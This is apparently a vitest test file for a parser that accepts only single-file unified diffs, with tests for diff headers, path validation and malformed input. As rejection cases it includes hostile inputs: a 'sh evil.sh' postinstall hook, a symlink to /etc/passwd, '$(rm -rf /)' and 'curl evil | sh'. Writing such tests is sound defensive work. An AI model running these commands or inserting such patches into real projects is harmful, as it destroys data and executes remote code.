import { describe, expect, it } from 'vitest';
import { parseSingleFilePatch, type PatchParseResult } from './patch.ts';

const lines = (...l: string[]): string => `${l.join('\n')}\n`;

const MODIFY = lines(
  '--- a/src/api/session.ts',
  '+++ b/src/api/session.ts',
  '@@ -1,3 +1,3 @@',
  ' export interface SessionInput {',
  '-  userId: string;',
  '+  userId: string; metadata?: unknown;',
  ' }',
);

function failure(result: PatchParseResult): { reasonCode: string; message: string } {
  if (result.ok) throw new Error(`expected rejection, got ${JSON.stringify(result.patch)}`);
  return result;
}

describe('parseSingleFilePatch', () => {
  describe('accepted patches', () => {
    it('parses a modification and re-emits canonical headers', () => {
      const result = parseSingleFilePatch('src/api/session.ts', MODIFY);
      expect(result).toEqual({
        ok: true,
        patch: {
          kind: 'modify',
          added: 1,
          removed: 1,
          hunks: 1,
          canonical: lines(
            'diff --git a/src/api/session.ts b/src/api/session.ts',
            '--- a/src/api/session.ts',
            '+++ b/src/api/session.ts',
            '@@ -1,3 +1,3 @@',
            ' export interface SessionInput {',
            '-  userId: string;',
            '+  userId: string; metadata?: unknown;',
            ' }',
          ),
        },
      });
    });

    it('parses a file creation from /dev/null', () => {
      const result = parseSingleFilePatch('src/api/new.ts', lines('--- /dev/null', '+++ b/src/api/new.ts', '@@ -0,0 +1,2 @@', '+export const a = 1;', '+export const b = 2;'));
      expect(result.ok && result.patch).toMatchObject({ kind: 'create', added: 2, removed: 0, hunks: 1 });
      expect(result.ok && result.patch.canonical).toBe(
        lines('diff --git a/src/api/new.ts b/src/api/new.ts', 'new file mode 100644', '--- /dev/null', '+++ b/src/api/new.ts', '@@ -0,0 +1,2 @@', '+export const a = 1;', '+export const b = 2;'),
      );
    });

    it('parses a file deletion to /dev/null', () => {
      const result = parseSingleFilePatch('src/api/old.ts', lines('--- a/src/api/old.ts', '+++ /dev/null', '@@ -1 +0,0 @@', '-export {};'));
      expect(result.ok && result.patch).toMatchObject({ kind: 'delete', added: 0, removed: 1 });
      expect(result.ok && result.patch.canonical).toContain('deleted file mode 100644\n--- a/src/api/old.ts\n+++ /dev/null\n');
    });

    it('accepts git extended headers (diff --git, index, regular file modes) and drops them', () => {
      const diff = lines('diff --git a/src/api/new.ts b/src/api/new.ts', 'new file mode 100644', 'index 0000000..e69de29', '--- /dev/null', '+++ b/src/api/new.ts', '@@ -0,0 +1 @@', '+x');
      const result = parseSingleFilePatch('src/api/new.ts', diff);
      expect(result.ok && result.patch.kind).toBe('create');
      expect(result.ok && result.patch.canonical).not.toContain('index ');
    });

    it('accepts header paths without a/ b/ prefixes, with timestamps, or quoted', () => {
      expect(parseSingleFilePatch('src/a.ts', lines('--- src/a.ts\t2026-11-04 10:00:00', '+++ src/a.ts\t2026-11-04 10:01:00', '@@ -1 +1 @@', '-a', '+b')).ok).toBe(true);
      expect(parseSingleFilePatch('src/a.ts', lines('--- "a/src/a.ts"', '+++ "b/src/a.ts"', '@@ -1 +1 @@', '-a', '+b')).ok).toBe(true);
    });

    it('normalizes CRLF line endings and treats empty hunk lines as context', () => {
      const result = parseSingleFilePatch('src/a.ts', '--- a/src/a.ts\r\n+++ b/src/a.ts\r\n@@ -1,3 +1,3 @@\r\n a\r\n\r\n-b\r\n+c\r\n');
      expect(result.ok && result.patch.canonical).toBe(lines('diff --git a/src/a.ts b/src/a.ts', '--- a/src/a.ts', '+++ b/src/a.ts', '@@ -1,3 +1,3 @@', ' a', ' ', '-b', '+c'));
    });

    it('counts multiple hunks', () => {
      const diff = lines('--- a/src/a.ts', '+++ b/src/a.ts', '@@ -1,2 +1,2 @@', ' a', '-b', '+B', '@@ -10,2 +10,2 @@', ' j', '-k', '+K', '\\ No newline at end of file');
      expect(parseSingleFilePatch('src/a.ts', diff)).toMatchObject({ ok: true, patch: { hunks: 2, added: 2, removed: 2 } });
    });

    it('treats a removed line that begins with "-- " inside a hunk as a removal, not a new file header', () => {
      // Removing the SQL comment "-- old comment" produces the diff line "--- old comment".
      const diff = lines('--- a/db/query.sql', '+++ b/db/query.sql', '@@ -1,3 +1,2 @@', ' select 1;', '--- old comment', ' select 2;');
      const result = parseSingleFilePatch('db/query.sql', diff);
      expect(result).toMatchObject({ ok: true, patch: { kind: 'modify', added: 0, removed: 1, hunks: 1 } });
      expect(result.ok && result.patch.canonical.endsWith(lines('@@ -1,3 +1,2 @@', ' select 1;', '--- old comment', ' select 2;'))).toBe(true);
    });

    it('treats a "-- " removal as the last line of the patch as a removal too', () => {
      const diff = lines('--- a/db/query.sql', '+++ b/db/query.sql', '@@ -1,2 +1 @@', ' select 1;', '--- trailing comment');
      expect(parseSingleFilePatch('db/query.sql', diff)).toMatchObject({ ok: true, patch: { removed: 1, added: 0 } });
    });
  });

  describe('multi-file patches', () => {
    it('rejects a second diff --git section', () => {
      const diff = MODIFY.replace(/^/, 'diff --git a/src/api/session.ts b/src/api/session.ts\n') + lines('diff --git a/package.json b/package.json', '--- a/package.json', '+++ b/package.json', '@@ -1 +1 @@', '-{}', '+{"scripts":{}}');
      expect(failure(parseSingleFilePatch('src/api/session.ts', diff)).reasonCode).toBe('PATCH_PATH_MISMATCH');
    });

    it('rejects a second ---/+++ pair without diff --git', () => {
      const diff = MODIFY + lines('--- a/package.json', '+++ b/package.json', '@@ -1 +1 @@', '-{}', '+{"scripts":{"postinstall":"sh evil.sh"}}');
      expect(failure(parseSingleFilePatch('src/api/session.ts', diff))).toMatchObject({ reasonCode: 'PATCH_PATH_MISMATCH', message: expect.stringMatching(/more than one file/) });
    });
  });

  describe('unsupported headers', () => {
    it.each([
      ['rename', ['diff --git a/src/a.ts b/src/b.ts', 'similarity index 90%', 'rename from src/a.ts', 'rename to src/b.ts']],
      ['rename without similarity', ['diff --git a/src/a.ts b/src/b.ts', 'rename from src/a.ts', 'rename to src/b.ts']],
      ['copy', ['diff --git a/src/a.ts b/src/b.ts', 'copy from src/a.ts', 'copy to src/b.ts']],
      ['mode change', ['diff --git a/src/a.ts b/src/a.ts', 'old mode 100644', 'new mode 100755']],
      ['executable creation', ['diff --git a/src/a.ts b/src/a.ts', 'new file mode 100755', '--- /dev/null', '+++ b/src/a.ts', '@@ -0,0 +1 @@', '+x']],
      ['symlink creation', ['diff --git a/src/a.ts b/src/a.ts', 'new file mode 120000', '--- /dev/null', '+++ b/src/a.ts', '@@ -0,0 +1 @@', '+../../../etc/passwd']],
      ['symlink deletion', ['diff --git a/src/a.ts b/src/a.ts', 'deleted file mode 120000', '--- a/src/a.ts', '+++ /dev/null', '@@ -1 +0,0 @@', '-target']],
      ['submodule', ['diff --git a/src/a.ts b/src/a.ts', 'new file mode 160000']],
      ['GIT binary patch', ['diff --git a/src/a.ts b/src/a.ts', 'GIT binary patch', 'literal 5', 'abcde']],
      ['binary files differ', ['diff --git a/src/a.ts b/src/a.ts', 'Binary files a/src/a.ts and b/src/a.ts differ']],
      ['dissimilarity', ['diff --git a/src/a.ts b/src/a.ts', 'dissimilarity index 100%']],
    ])('rejects a %s header', (_label, diffLines) => {
      expect(failure(parseSingleFilePatch('src/a.ts', lines(...diffLines))).reasonCode).toBe('PATCH_UNSUPPORTED');
    });
  });

  describe('header path validation', () => {
    it('rejects headers naming a different file than declared', () => {
      const result = failure(parseSingleFilePatch('src/api/session.ts', MODIFY.replaceAll('src/api/session.ts', 'package.json')));
      expect(result).toMatchObject({ reasonCode: 'PATCH_PATH_MISMATCH', message: expect.stringContaining('package.json') });
    });

    it('rejects when only the new-side header differs', () => {
      const diff = lines('--- a/src/a.ts', '+++ b/src/b.ts', '@@ -1 +1 @@', '-a', '+b');
      expect(failure(parseSingleFilePatch('src/a.ts', diff)).reasonCode).toBe('PATCH_PATH_MISMATCH');
    });

    it.each(['a/../outside.txt', '/etc/passwd', 'a/.git/config'])('rejects an invalid header path %j', (header) => {
      const diff = lines(`--- ${header}`, `+++ ${header}`, '@@ -1 +1 @@', '-a', '+b');
      expect(failure(parseSingleFilePatch('src/a.ts', diff))).toMatchObject({ reasonCode: 'PATCH_PATH_MISMATCH', message: expect.stringMatching(/invalid path/) });
    });

    it('rejects /dev/null on both sides', () => {
      const diff = lines('--- /dev/null', '+++ /dev/null', '@@ -0,0 +0,0 @@');
      expect(failure(parseSingleFilePatch('src/a.ts', diff)).reasonCode).toBe('PATCH_UNSUPPORTED');
    });
  });

  describe('malformed patches', () => {
    it.each([
      ['NUL bytes', `${MODIFY}\0`],
      ['missing headers', lines('@@ -1 +1 @@', '-a', '+b')],
      ['headers without hunks', lines('--- a/src/a.ts', '+++ b/src/a.ts')],
      ['malformed hunk header', lines('--- a/src/a.ts', '+++ b/src/a.ts', '@@ -x +y @@', '-a')],
      ['garbage inside a hunk', lines('--- a/src/a.ts', '+++ b/src/a.ts', '@@ -1 +1 @@', '-a', '+b', '$(rm -rf /)')],
      ['garbage before headers', lines('#!/bin/sh', 'curl evil | sh', '--- a/src/a.ts', '+++ b/src/a.ts', '@@ -1 +1 @@', '-a', '+b')],
      ['empty patch', ''],
    ])('rejects %s', (_label, diff) => {
      expect(failure(parseSingleFilePatch('src/a.ts', diff)).reasonCode).toBe('PATCH_UNSUPPORTED');
    });
  });
});
